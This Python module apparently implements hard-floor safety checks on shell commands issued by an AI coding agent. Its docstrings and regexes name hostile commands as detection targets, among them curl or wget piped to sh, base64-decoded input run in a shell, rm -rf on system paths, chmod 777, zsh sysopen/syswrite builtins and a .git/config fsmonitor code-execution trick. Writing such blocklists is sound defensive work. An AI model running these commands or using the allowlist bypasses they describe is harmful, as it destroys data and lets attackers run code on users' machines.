"""Bash-command safety — Tier A hard floors.

Shell commands the agent MUST refuse regardless of permission mode, user
rule grants, or ``--bypass-permissions``. Mirrors claude-code's
``bashSecurity.ts`` + ``readOnlyValidation.ts`` + ``pathValidation.ts`` +
``sedValidation.ts`` — each entry below is a known shell
parser-differential / privilege-escalation / irreversible-damage vector
that CANNOT be made safe by "the user said yes".

Parsing depth: hybrid. Segment splitting (``;``/``&&``/``||``/``|``/newline)
is quote-aware via a hand-rolled stdlib state machine. Token-level checks
use ``shlex.split`` — stdlib POSIX tokenizer, NOT a full bash AST. Full
AST (tree-sitter) is what claude-code uses; we accept this gap in exchange
for zero-dependency safety. Known limitations (documented per rule):

  - Nested command substitution / process substitution inside valid
    POSIX structures: we reject on sight rather than recurse.
  - Shell expansion: tilde (``~``) and environment-variable (``$HOME``,
    ``${HOME}``) forms ARE resolved at the path-classification step
    (``os.path.expanduser`` + ``os.path.expandvars``), so ``rm -rf $HOME``
    and ``rm -rf ~root`` are caught. Brace expansion (``rm -rf /{etc,tmp}``)
    and glob expansion are NOT resolved — they require running bash, and
    Python's stdlib has no equivalent. Known-false-negative, documented.
  - BSD-sed vs. GNU-sed ``-i`` semantics: handled conservatively (any
    ``i`` in a short-flag cluster triggers the rule regardless of the
    next token's role).

Layer boundary: this module is a PURE policy — no I/O, no journaling.
The hook layer (``aura.core.hooks.bash_safety``) is responsible for
journaling and returning a ``ToolResult``. Keeping the policy pure is
what lets it share the architectural shape of
``aura.core.permissions.safety`` (paths) and stay test-friendly.

The four checks (evaluated in this order — cheapest / earliest-blocking
first):

1. **cr_outside_double_quote** — a raw ``\\r`` anywhere outside a
   ``"..."`` region. The ``shell-quote`` JS tokenizer (used by claude-
   code's allowlist matcher) treats ``\\r`` as a token boundary, while
   bash treats it as command text — the differential is command
   injection past an allowlist. Python's shlex has a closely related
   differential; we reject the input outright rather than reason about
   which tokenizer agrees.

2. **zsh_dangerous_command** — any segment (split on ``;`` / ``&&`` /
   ``||`` / ``|`` / newline) whose first token is one of a small set of
   zsh builtins that bypass the usual file-access checks. Attack:
   ``zmodload zsh/system && syswrite ...`` uses ``syswrite`` to scribble
   on an fd bash would never let a normal ``echo >`` reach.

3. **malformed_with_separator** — ``shlex.split`` raises (unbalanced
   quote, invalid escape) AND the raw command contains a command
   separator outside quoted regions. Attack vector:
   ``echo {"hi":"hi;evil"}`` — the unbalanced-looking quote plus the
   ``;`` lets an eval-like mechanism re-enter with ``evil`` as a fresh
   command. A malformed command WITHOUT a separator is just a bad
   command; the tool's own error path handles it.

4. **cd_git_compound** — any command that parses to a token list
   containing BOTH ``cd`` AND ``git`` as free-standing tokens. Attack
   vector: cd into a malicious repo whose ``.git/config`` has
   ``core.fsmonitor = <rce payload>``; the next ``git status`` fires
   it. Over-broad in principle but extremely low false-positive in
   practice (benign prose with ``cd`` and ``git`` lives in quoted
   strings, which shlex collapses into a single arg).

Failure mode inversion
----------------------

Normally "fail closed" is the safe default for a safety check. This
module inverts that for ONE specific case: if our OWN parsing code
crashes on a weird input (huge buffer, embedded NULs, unexpected
encoding), we return ``None`` rather than raising. Rationale: a typo
in THIS file would otherwise block every bash call the agent ever
makes. The legitimate attack surface (the four rules above) uses
parseable inputs; a parser crash means our code is buggy, not that
the input is an attack. The lesser evil is fail-open for bugs.

``shlex`` / raw-string anomalies inside the rules themselves still
fail closed — e.g. ``shlex.split`` raising IS a rule-3 signal, not a
bug-fail-open.
"""

from __future__ import annotations

import os
import re
import shlex
from dataclasses import dataclass
from typing import Literal

# 18 entries — the exhaustive zsh-builtin list that bypasses bash's
# usual file-access / fd-owner checks. Not a superset of "dangerous zsh
# builtins" in general; only the subset that attackers have actually
# leveraged for sandbox escape in shell-allowlist tools.
ZSH_DANGEROUS_COMMANDS: frozenset[str] = frozenset({
    "zmodload", "emulate",
    "sysopen", "sysread", "syswrite", "sysseek",
    "zpty", "ztcp", "zsocket",
    "mapfile",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod",
    "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
})

Reason = Literal[
    "zsh_dangerous_command",
    "cr_outside_double_quote",
    "malformed_with_separator",
    "cd_git_compound",
    "command_substitution",
    "pipe_to_shell",
    "sed_inplace_system_path",
    "redirect_to_system_path",
    "destructive_removal",
    "world_writable_chmod",
    "root_chown",
    "exec_destructive",
    "obfuscated_execution",
]


# ---------------------------------------------------------------------------
# Shared data — system prefixes / shell names / destructive commands
# ---------------------------------------------------------------------------

# System-owned path prefixes. Writing (>, >>, sed -i, rm -rf) under any of
# these is a Tier A hard floor — the agent cannot make those edits "safe"
# even if the user grants permission in the current session.
#
# Intentionally omitted: ``/var`` (legitimate log / tmp subtrees under it),
# ``/opt`` (user-installed software, user-owned on common distros), ``/tmp``
# (obviously legitimate scratch space). Add here only if the attack surface
# outweighs the false-positive rate.
_SYSTEM_PATH_PREFIXES: tuple[str, ...] = (
    "/etc",
    "/usr",
    "/bin",
    "/sbin",
    "/boot",
    "/sys",
    "/proc",
    "/dev",
    "/root",
    "/lib",
    "/lib64",
    "/System",      # macOS
    "/Library",     # macOS (system-level; user Library is ~/Library)
)

# Targets that look like /dev/... but are NOT real system writes. /dev/null
# is the canonical "discard output" target; /dev/stdout and /dev/stderr are
# legitimate re-routings; /dev/tty is a terminal handle.
_SAFE_DEV_TARGETS: frozenset[str] = frozenset({
    "/dev/null",
    "/dev/stdout",
    "/dev/stderr",
    "/dev/tty",
    "/dev/fd",  # /dev/fd/N
})

# Shell interpreter names — if any of these is the FIRST token of a
# pipeline segment that follows a `|`, the preceding segment's stdout is
# being executed as shell script (``curl ... | bash``). This is the
# canonical "remote execution of untrusted content" pattern.
_SHELL_NAMES: frozenset[str] = frozenset({
    "sh", "bash", "zsh", "ksh", "dash", "csh", "tcsh", "fish",
})

# Destructive commands for the exec / obfuscation rules. ``exec rm -rf x``
# replaces the shell with rm; ``exec chmod 777 /`` likewise. We block the
# first-token==exec + dangerous-second-token combo outright.
_DESTRUCTIVE_COMMANDS: frozenset[str] = frozenset({
    "rm", "chmod", "chown", "dd", "mkfs", "shred", "wipe",
})


@dataclass(frozen=True)
class BashSafetyViolation:
    """A single-reason reject. ``detail`` is cited verbatim in the
    ToolResult.error surfaced to the model, so keep it one line and
    actionable."""

    reason: Reason
    detail: str


# Segment-split regex — same separators shlex / bash treat as command
# boundaries. Compiled once; used for the per-segment zsh-builtin scan.
_SEGMENT_SPLIT = re.compile(r"(?:\|\||&&|[;|\n])")


def check_bash_safety(command: str) -> BashSafetyViolation | None:
    """Return the first Tier A violation, or None if the command is safe.

    Order (documented contract — tests depend on it):
      1. cr_outside_double_quote   — cheap, no tokenization needed
      2. command_substitution      — ``$(...)`` / ``` `...` ``` / eval / ``-c``
      3. obfuscated_execution      — ``base64 -d`` / ``xxd -r`` piped to shell
      4. pipe_to_shell             — ``curl X | sh``, ``wget X | bash``
      5. zsh_dangerous_command     — per-segment first-token scan
      6. exec_destructive          — ``exec rm -rf x`` and friends
      7. destructive_removal       — ``rm -rf /`` / ``rm -rf /etc`` on system prefixes
      8. world_writable_chmod      — ``chmod 777`` / ``chmod -R 0777``
      9. root_chown                — ``chown root ...``
     10. sed_inplace_system_path   — ``sed -i`` targeting system prefixes
     11. redirect_to_system_path   — ``> /etc/...`` / ``>> /boot/...``
     12. malformed_with_separator  — shlex raises + separator outside quotes
     13. cd_git_compound           — both tokens present in the flat tokenization

    Rule 2 precedes rule 5 because command substitution is the canonical
    bypass of the zsh-builtin check: ``echo $(zmodload x)`` tokenizes with
    ``$(zmodload`` as one token and ``x)`` as another, so the zsh rule
    never sees ``zmodload`` as a first token — bash nonetheless expands
    the substitution at runtime and executes it.

    Rule 3 (obfuscated_execution) precedes rule 4 (pipe_to_shell) because
    ``base64 -d ... | sh`` is a strict subset of pipe-to-shell but the
    obfuscation reason is more informative for the model's error message.
    """
    if not isinstance(command, str) or not command:
        return None

    try:
        # 1. CR outside double quotes.
        violation = _check_cr_outside_quotes(command)
        if violation is not None:
            return violation

        # 2. Command substitution — bypass of all other static checks.
        violation = _check_command_substitution(command)
        if violation is not None:
            return violation

        # 3. Obfuscated execution (subset of pipe-to-shell with a more
        # informative error message).
        violation = _check_obfuscated_execution(command)
        if violation is not None:
            return violation

        # 4. Pipe to shell — ``curl X | sh``.
        violation = _check_pipe_to_shell(command)
        if violation is not None:
            return violation

        # 5. ZSH dangerous command (per segment).
        violation = _check_zsh_dangerous(command)
        if violation is not None:
            return violation

        # 6. exec + destructive command.
        violation = _check_exec_destructive(command)
        if violation is not None:
            return violation

        # 7. rm -rf on system prefixes.
        violation = _check_destructive_removal(command)
        if violation is not None:
            return violation

        # 8. chmod 777 (world-writable).
        violation = _check_world_writable_chmod(command)
        if violation is not None:
            return violation

        # 9. chown root ...
        violation = _check_root_chown(command)
        if violation is not None:
            return violation

        # 10. sed -i on system paths.
        violation = _check_sed_inplace_system_path(command)
        if violation is not None:
            return violation

        # 11. Redirect to system path.
        violation = _check_redirect_to_system_path(command)
        if violation is not None:
            return violation

        # 12. Malformed + separator.
        violation = _check_malformed_with_separator(command)
        if violation is not None:
            return violation

        # 13. cd + git compound.
        violation = _check_cd_git_compound(command)
        if violation is not None:
            return violation

        return None
    except Exception:  # noqa: BLE001 — see module docstring "failure mode inversion"
        # A bug in our own parser must not block every bash call the
        # agent ever makes. The four real attack classes all use
        # parseable inputs; a parser crash means we have a bug.
        return None


# ---------------------------------------------------------------------------
# Rule 1 — carriage return outside double quotes
# ---------------------------------------------------------------------------


def _check_cr_outside_quotes(command: str) -> BashSafetyViolation | None:
    """Naive toggle: ``"`` flips double-quote state; raw ``\\r`` outside
    is a reject. Doesn't model backslash-escapes or single quotes —
    bash's rules are complex, but the CR-specific differential (TZ=UTC
    \\r echo evil) has no quoting in the attack, so a naive state
    machine is sufficient."""
    in_double_quote = False
    for ch in command:
        if ch == '"':
            in_double_quote = not in_double_quote
        elif ch == "\r" and not in_double_quote:
            return BashSafetyViolation(
                reason="cr_outside_double_quote",
                detail="carriage return outside double-quoted region",
            )
    return None


# ---------------------------------------------------------------------------
# Rule 2 — command substitution / eval / shell -c flag (bypass of static checks)
# ---------------------------------------------------------------------------


# Single-quote strip FIRST — bash does NOT substitute inside '...' literals,
# so a literal "$(" there is harmless. Then scan the residual for the three
# dynamic-exec patterns.
_SINGLE_QUOTED = re.compile(r"'[^']*'")
_DYNAMIC_EXEC = re.compile(
    r"""
    \$\(           |  # POSIX command substitution
    `              |  # backtick substitution
    (?<![\w-])(?:bash|sh|zsh)\s+-c(?:\s|$) |  # shell -c <cmd>
    (?<![\w-])eval(?:\s|$)                    # eval as a free token
    """,
    re.VERBOSE,
)


def _check_command_substitution(command: str) -> BashSafetyViolation | None:
    """Reject dynamic-execution constructs that evaluate arbitrary strings at
    runtime: ``$(...)`` / backticks / ``(ba|z|)sh -c`` / ``eval``. Each is
    a bypass vector — the outer command is innocent-looking; the inner
    payload only materializes when bash expands it. Single-quoted regions
    are stripped before scanning (bash disables substitution in ``'...'``)."""
    residual = _SINGLE_QUOTED.sub("", command)
    if _DYNAMIC_EXEC.search(residual):
        return BashSafetyViolation(
            reason="command_substitution",
            detail=(
                "command substitution ($(...), backticks, or -c flag) "
                "bypasses static command checks"
            ),
        )
    return None


# ---------------------------------------------------------------------------
# Rule 3 — zsh dangerous builtin as a segment's first token
# ---------------------------------------------------------------------------


def _check_zsh_dangerous(command: str) -> BashSafetyViolation | None:
    """Split on command separators; for each segment, try to tokenize;
    if the first token is in the dangerous set, reject. Silent-skip
    segments whose tokenization fails — rule 3 covers that case."""
    for segment in _SEGMENT_SPLIT.split(command):
        stripped = segment.strip()
        if not stripped:
            continue
        try:
            tokens = shlex.split(stripped, posix=True)
        except ValueError:
            continue
        if tokens and tokens[0] in ZSH_DANGEROUS_COMMANDS:
            return BashSafetyViolation(
                reason="zsh_dangerous_command",
                detail=f"zsh builtin '{tokens[0]}' bypasses file-access checks",
            )
    return None


# ---------------------------------------------------------------------------
# Rule 3 — malformed tokenization AND separator present outside quotes
# ---------------------------------------------------------------------------


_QUOTED_REGION = re.compile(r'"[^"]*"|\'[^\']*\'')
_SEPARATOR_OUTSIDE_QUOTES = re.compile(r"(?:\|\||&&|;)")


def _check_malformed_with_separator(command: str) -> BashSafetyViolation | None:
    try:
        shlex.split(command, posix=True)
    except ValueError:
        # Strip matched quoted regions, THEN look for separators in what
        # remains. If a separator survives, a malformed tokenization +
        # re-entry vector is present.
        stripped = _QUOTED_REGION.sub("", command)
        if _SEPARATOR_OUTSIDE_QUOTES.search(stripped):
            return BashSafetyViolation(
                reason="malformed_with_separator",
                detail="unparseable shell tokens adjacent to a command separator",
            )
    return None


# ---------------------------------------------------------------------------
# Rule 4 — cd + git compound
# ---------------------------------------------------------------------------


def _check_cd_git_compound(command: str) -> BashSafetyViolation | None:
    """Flat tokenization: if BOTH ``cd`` and ``git`` appear as
    free-standing tokens anywhere in the command, reject. Order and
    adjacency don't matter — a malicious ``.git/config`` fires on any
    subsequent git invocation within the repo."""
    try:
        tokens = shlex.split(command, posix=True)
    except ValueError:
        # Rule 3 already handled; here the compound check simply
        # can't run, so no rule-4 signal.
        return None
    if "cd" in tokens and "git" in tokens:
        return BashSafetyViolation(
            reason="cd_git_compound",
            detail="cd + git in the same command enables .git/config RCE",
        )
    return None


# ---------------------------------------------------------------------------
# Shared helpers — quote-aware segmentation and path classification
# ---------------------------------------------------------------------------


def _split_segments_quote_aware(command: str) -> list[str]:
    """Split on ``;``/``&&``/``||``/``|``/newline, but ONLY when the separator
    appears OUTSIDE a quoted region. Needed so ``echo "rm -rf" > /tmp/x``
    stays a single segment instead of being torn apart on the literal
    ``-rf`` vs. the pipe inside quotes.

    Stdlib-only: hand-rolled one-pass state machine. Tracks ``'...'`` /
    ``"..."`` / backslash-escape. Returns raw substrings (caller re-tokenizes
    each segment with ``shlex`` as needed)."""
    segments: list[str] = []
    buf: list[str] = []
    in_single = False
    in_double = False
    i = 0
    n = len(command)
    while i < n:
        ch = command[i]

        # Backslash escapes the next character outside single quotes.
        if ch == "\\" and not in_single and i + 1 < n:
            buf.append(ch)
            buf.append(command[i + 1])
            i += 2
            continue

        if ch == "'" and not in_double:
            in_single = not in_single
            buf.append(ch)
            i += 1
            continue

        if ch == '"' and not in_single:
            in_double = not in_double
            buf.append(ch)
            i += 1
            continue

        if not in_single and not in_double:
            # Two-char separators first.
            two = command[i:i + 2]
            if two in ("&&", "||"):
                segments.append("".join(buf))
                buf = []
                i += 2
                continue
            if ch in (";", "|", "\n"):
                segments.append("".join(buf))
                buf = []
                i += 1
                continue

        buf.append(ch)
        i += 1

    segments.append("".join(buf))
    return segments


def _pipe_segments_quote_aware(command: str) -> list[str]:
    """Pipeline-only split — respects quotes, splits on ``|`` only (NOT
    ``||``). Needed for the pipe-to-shell rule: we want to know what
    follows each ``|`` in a pipeline, independent of ``&&``/``;`` boundaries
    which introduce separate statements."""
    segments: list[str] = []
    buf: list[str] = []
    in_single = False
    in_double = False
    i = 0
    n = len(command)
    while i < n:
        ch = command[i]

        if ch == "\\" and not in_single and i + 1 < n:
            buf.append(ch)
            buf.append(command[i + 1])
            i += 2
            continue

        if ch == "'" and not in_double:
            in_single = not in_single
            buf.append(ch)
            i += 1
            continue

        if ch == '"' and not in_single:
            in_double = not in_double
            buf.append(ch)
            i += 1
            continue

        if not in_single and not in_double:
            # Skip ``||`` — that's a statement separator, not a pipe.
            if command[i:i + 2] == "||":
                buf.append("||")
                i += 2
                continue
            if ch == "|":
                segments.append("".join(buf))
                buf = []
                i += 1
                continue

        buf.append(ch)
        i += 1

    segments.append("".join(buf))
    return segments


def _is_system_path(path: str) -> bool:
    """True iff ``path`` sits under a known system-owned prefix.

    Tilde (``~``, ``~root``) and environment-variable (``$HOME``, ``${VAR}``)
    forms are expanded before the prefix check so ``rm -rf $HOME`` and
    ``rm -rf ~root`` are caught. Brace expansion (``/{etc,tmp}``) and glob
    expansion are NOT resolved — see module docstring for the residual gap.
    """
    if not path:
        return False
    # Strip surrounding quotes that shlex would have stripped.
    cleaned = path.strip("\"'")
    # Resolve tilde + env-var expansion BEFORE the prefix scan so obfuscated
    # forms like ``$HOME`` (root's home is /root) and ``~root`` are caught.
    cleaned = os.path.expandvars(os.path.expanduser(cleaned))
    if cleaned in _SAFE_DEV_TARGETS:
        return False
    # /dev/fd/N family
    if cleaned.startswith("/dev/fd/"):
        return False
    for prefix in _SYSTEM_PATH_PREFIXES:
        if cleaned == prefix or cleaned.startswith(prefix + "/"):
            return True
    return False


def _first_token(segment: str) -> str | None:
    """Return the first shlex token of ``segment`` (after leading
    assignments like ``FOO=bar cmd``). Returns ``None`` if tokenization
    fails or the segment is empty / all-assignment."""
    stripped = segment.strip()
    if not stripped:
        return None
    try:
        tokens = shlex.split(stripped, posix=True)
    except ValueError:
        return None
    for tok in tokens:
        # Skip leading VAR=value assignments — the actual command comes after.
        if "=" in tok and not tok.startswith("=") and tok[0].isalpha():
            # Only strip if the LHS is identifier-like (no spaces, etc.)
            lhs = tok.split("=", 1)[0]
            if lhs.replace("_", "").isalnum():
                continue
        return tok
    return None


# ---------------------------------------------------------------------------
# Rule: pipe to shell — curl|sh, wget|bash, echo|sh, etc.
# ---------------------------------------------------------------------------


def _check_pipe_to_shell(command: str) -> BashSafetyViolation | None:
    """If any pipeline segment AFTER the first ``|`` has a shell
    interpreter as its first token, reject. Captures:

      curl https://x | sh
      wget -qO- https://x | bash
      echo '...' | zsh

    Does NOT capture pipe-to-shell where the interpreter is aliased or
    invoked via ``/bin/sh`` — handling full paths would require another
    rule (see ``/bin/`` redirect catch below); aliased shells are beyond
    static reach without running bash."""
    segments = _pipe_segments_quote_aware(command)
    if len(segments) < 2:
        return None
    for seg in segments[1:]:
        tok = _first_token(seg)
        if tok is None:
            continue
        # Normalize ``/bin/sh`` / ``/usr/bin/bash`` etc. to the basename.
        basename = tok.rsplit("/", 1)[-1]
        if basename in _SHELL_NAMES:
            return BashSafetyViolation(
                reason="pipe_to_shell",
                detail=f"piping into shell interpreter '{basename}' executes arbitrary input",
            )
    return None


# ---------------------------------------------------------------------------
# Rule: exec + destructive — exec rm -rf x, exec chmod 777 /
# ---------------------------------------------------------------------------


def _check_exec_destructive(command: str) -> BashSafetyViolation | None:
    """``exec CMD ARGS`` replaces the current shell with CMD. If CMD is
    in the destructive set, reject outright — the shell wouldn't survive
    the operation even if the agent later tried to recover.

    Per-segment check: each statement-level segment's first two tokens
    are inspected; ``foo && exec rm -rf x`` catches the second segment."""
    for segment in _split_segments_quote_aware(command):
        stripped = segment.strip()
        if not stripped:
            continue
        try:
            tokens = shlex.split(stripped, posix=True)
        except ValueError:
            continue
        if (
            len(tokens) >= 2
            and tokens[0] == "exec"
            and tokens[1] in _DESTRUCTIVE_COMMANDS
        ):
            return BashSafetyViolation(
                reason="exec_destructive",
                detail=f"exec replacing shell with destructive '{tokens[1]}'",
            )
    return None


# ---------------------------------------------------------------------------
# Rule: destructive removal on system prefixes — rm -rf /etc, rm -rf /
# ---------------------------------------------------------------------------


def _check_destructive_removal(command: str) -> BashSafetyViolation | None:
    """Per-segment: if ``rm`` is the command, any flag among ``-r``/``-R``/``-f``
    (including combined short flags like ``-rf``/``-Rfv``) is present, AND
    any positional argument resolves under a system prefix (or is exactly
    ``/``), reject.

    Does NOT block ``rm -rf /tmp/foo`` — tmp is legitimate scratch space;
    the system-path gate is what makes this Tier A rather than an overbroad
    tool-kill-switch."""
    for segment in _split_segments_quote_aware(command):
        stripped = segment.strip()
        if not stripped:
            continue
        try:
            tokens = shlex.split(stripped, posix=True)
        except ValueError:
            continue
        if not tokens or tokens[0] != "rm":
            continue

        has_recursive_or_force = False
        positionals: list[str] = []
        for tok in tokens[1:]:
            if tok.startswith("--"):
                if tok in ("--recursive", "--force"):
                    has_recursive_or_force = True
                continue
            if tok.startswith("-") and len(tok) > 1:
                # Combined short flags: -rf / -Rfv / -fr — any 'r'/'R'/'f' char.
                if any(c in tok[1:] for c in ("r", "R", "f")):
                    has_recursive_or_force = True
                continue
            positionals.append(tok)

        if not has_recursive_or_force:
            continue

        for path in positionals:
            if path == "/" or _is_system_path(path):
                return BashSafetyViolation(
                    reason="destructive_removal",
                    detail=f"rm -rf on system path '{path}' is irreversible",
                )
    return None


# ---------------------------------------------------------------------------
# Rule: world-writable chmod — 777 / 0777 / a+rwx on any path
# ---------------------------------------------------------------------------


# Match ``chmod [-R] 777`` / ``chmod 0777`` / ``chmod a+rwx`` / ``chmod +rwx``
# anchored at word boundaries so ``chmod7777`` (not a real cmd) doesn't match.
_CHMOD_WORLD_WRITABLE = re.compile(
    r"""
    \bchmod\b                 # chmod as its own token
    (?:\s+-[A-Za-z]+)?        # optional short flags (e.g., -R, -Rv)
    \s+
    (?:
        0?777                 # octal 777 with optional leading zero
        |
        [ugoa]*[+=][rwx]*w[rwx]*  # symbolic: a+w, o+w, go+rw, a=rwx, etc.
    )
    \b
    """,
    re.VERBOSE,
)


def _check_world_writable_chmod(command: str) -> BashSafetyViolation | None:
    """Reject ``chmod 777`` / ``chmod 0777`` / ``chmod a+w`` / ``chmod o+w``.
    World-writable permissions on ANY path — not just system ones — are a
    Tier A hard floor: the legitimate use cases (test fixtures, explicit
    user-scoped sandboxes) are vanishingly rare compared to the attack
    surface (backdooring shared config, exposing secrets)."""
    # Check the RAW command — quote stripping would mask literals like
    # ``echo "chmod 777"`` but that's inside double quotes, which means
    # it's an argument to echo, not a chmod invocation. Use segment-aware
    # check instead.
    for segment in _split_segments_quote_aware(command):
        stripped = segment.strip()
        if not stripped:
            continue
        try:
            tokens = shlex.split(stripped, posix=True)
        except ValueError:
            continue
        if not tokens or tokens[0] != "chmod":
            continue
        # Reconstruct a safe string for the regex (tokens are unquoted).
        reconstructed = " ".join(tokens)
        if _CHMOD_WORLD_WRITABLE.search(reconstructed):
            return BashSafetyViolation(
                reason="world_writable_chmod",
                detail="chmod to world-writable permissions (777 / a+w / o+w)",
            )
    return None


# ---------------------------------------------------------------------------
# Rule: root chown — chown root / chown 0: / chown root:root
# ---------------------------------------------------------------------------


def _check_root_chown(command: str) -> BashSafetyViolation | None:
    """``chown root ...`` / ``chown 0:0 ...`` grants root ownership. Always
    Tier A — no legitimate agent workflow needs to reparent files to root."""
    for segment in _split_segments_quote_aware(command):
        stripped = segment.strip()
        if not stripped:
            continue
        try:
            tokens = shlex.split(stripped, posix=True)
        except ValueError:
            continue
        if not tokens or tokens[0] != "chown":
            continue
        # First non-flag arg is the user[:group] spec.
        for tok in tokens[1:]:
            if tok.startswith("-"):
                continue
            spec = tok.split(":")[0]
            if spec in ("root", "0"):
                return BashSafetyViolation(
                    reason="root_chown",
                    detail=f"chown to root ('{tok}') escalates ownership",
                )
            break  # Only the first non-flag arg is the owner spec.
    return None


# ---------------------------------------------------------------------------
# Rule: sed -i on system paths — in-place edits to /etc/passwd etc.
# ---------------------------------------------------------------------------


def _check_sed_inplace_system_path(command: str) -> BashSafetyViolation | None:
    """``sed -i '...' /etc/passwd`` rewrites a system config file. Reject
    when BOTH:
      - first token is ``sed``
      - any of ``-i``, ``--in-place``, or combined short flag containing ``i``
        is present
      - any non-flag positional argument resolves under a system prefix

    BSD-sed requires an argument to ``-i`` (e.g., ``sed -i '' ...``); the
    next-token is consumed as the backup suffix, not a file. We handle this
    by only treating the FINAL non-flag positional as the target file —
    the common case; fully modelling BSD-sed vs. GNU-sed is out of scope
    and doesn't change the decision (a system-path positional is still
    system-path, wherever it appears)."""
    for segment in _split_segments_quote_aware(command):
        stripped = segment.strip()
        if not stripped:
            continue
        try:
            tokens = shlex.split(stripped, posix=True)
        except ValueError:
            continue
        if not tokens or tokens[0] != "sed":
            continue

        has_inplace = False
        positionals: list[str] = []
        for tok in tokens[1:]:
            if tok in ("--in-place",) or tok.startswith("--in-place="):
                has_inplace = True
                continue
            if tok.startswith("--"):
                continue
            if tok.startswith("-") and len(tok) > 1:
                # ``-i`` alone OR combined like ``-iE`` / ``-Ei``.
                if "i" in tok[1:]:
                    has_inplace = True
                continue
            positionals.append(tok)

        if not has_inplace:
            continue

        for path in positionals:
            if _is_system_path(path):
                return BashSafetyViolation(
                    reason="sed_inplace_system_path",
                    detail=f"sed -i on system path '{path}' rewrites system config",
                )
    return None


# ---------------------------------------------------------------------------
# Rule: redirect to system path — > /etc/foo, >> /boot/foo, &> /usr/bin/x
# ---------------------------------------------------------------------------


# Parse redirects OUTSIDE quoted regions. Match ``>``/``>>``/``&>``/``&>>``
# followed by whitespace + a target token. Targets end at whitespace or
# another shell metacharacter.
_REDIRECT_OUTSIDE_QUOTES = re.compile(
    r"""
    (?<!\d)                     # no fd-number prefix (2>&1 is NOT a file redirect)
    (?:&>>|&>|>>|>)             # the redirect operator
    \s*
    (
        (?:'[^']*')             # single-quoted target
        |
        (?:"[^"]*")             # double-quoted target
        |
        (?:[^\s;&|<>()]+)       # bare token up to whitespace or metachar
    )
    """,
    re.VERBOSE,
)


def _check_redirect_to_system_path(command: str) -> BashSafetyViolation | None:
    """Scan for redirect operators outside quoted regions; if any target
    resolves to a system path, reject. Does NOT model fd duplication
    (``2>&1``) — the leading ``\\d`` lookbehind excludes that case. Does
    NOT model ``>&filename`` (deprecated bash form); those are rare and
    filenameless ``>&`` is fd-dup."""
    # Strip contents of single-quoted regions (but keep the quotes as
    # placeholders) so a literal ``'>/etc/foo'`` inside single quotes can't
    # false-match. Double quotes still permit expansion, so double-quoted
    # targets ARE honored by bash — we leave them in place.
    #
    # We don't strip quoted REGIONS because we need the regex to match
    # ``> /etc/foo`` where the target is unquoted. Instead, we pre-compute
    # the ranges of single-quoted content and skip matches inside them.
    single_quoted_ranges: list[tuple[int, int]] = []
    in_single = False
    in_double = False
    start = -1
    for idx, ch in enumerate(command):
        if ch == '"' and not in_single:
            in_double = not in_double
            continue
        if ch == "'" and not in_double:
            if in_single:
                single_quoted_ranges.append((start, idx))
                in_single = False
            else:
                in_single = True
                start = idx + 1

    def _inside_single_quotes(pos: int) -> bool:
        return any(lo <= pos < hi for lo, hi in single_quoted_ranges)

    for match in _REDIRECT_OUTSIDE_QUOTES.finditer(command):
        if _inside_single_quotes(match.start()):
            continue
        target = match.group(1)
        if _is_system_path(target):
            return BashSafetyViolation(
                reason="redirect_to_system_path",
                detail=f"redirect to system path '{target}'",
            )
    return None


# ---------------------------------------------------------------------------
# Rule: obfuscated execution — base64 -d | sh, xxd -r | bash
# ---------------------------------------------------------------------------


# Patterns that decode binary/encoded input and hand it to a shell. The
# signature is the DECODER + pipe + SHELL on the same pipeline. Pure
# pattern-level — stdlib can't tell ``base64 -d`` from ``base64 --help``
# without running it; false-positive rate is acceptable because
# base64-into-shell has no legitimate agent use case.
_OBFUSCATED_DECODERS = (
    r"base64\s+(?:-d|-D|--decode)",
    r"xxd\s+-r",
    r"openssl\s+(?:base64|enc)\s+-d",
)
_OBFUSCATED_EXEC_RE = re.compile(
    r"(?:" + "|".join(_OBFUSCATED_DECODERS) + r")"
    r"[^|]*\|\s*(?:/[A-Za-z0-9_/.-]+/)?"  # optional /path/to/
    r"(?:" + "|".join(re.escape(s) for s in _SHELL_NAMES) + r")\b",
)


def _check_obfuscated_execution(command: str) -> BashSafetyViolation | None:
    """Decoder-into-shell pipelines: ``base64 -d foo | sh``,
    ``openssl enc -d -base64 | bash``, ``xxd -r -p | zsh``. Covered as
    a dedicated reason (not just ``pipe_to_shell``) because the error
    message then tells the model *why* this subset is particularly bad
    and guides it to a transparent alternative.

    Single-quoted regions are stripped first — a literal
    ``echo 'base64 -d | sh'`` should not false-match."""
    residual = _SINGLE_QUOTED.sub("", command)
    if _OBFUSCATED_EXEC_RE.search(residual):
        return BashSafetyViolation(
            reason="obfuscated_execution",
            detail="decoding encoded input into a shell (base64 -d | sh, etc.)",
        )
    return None
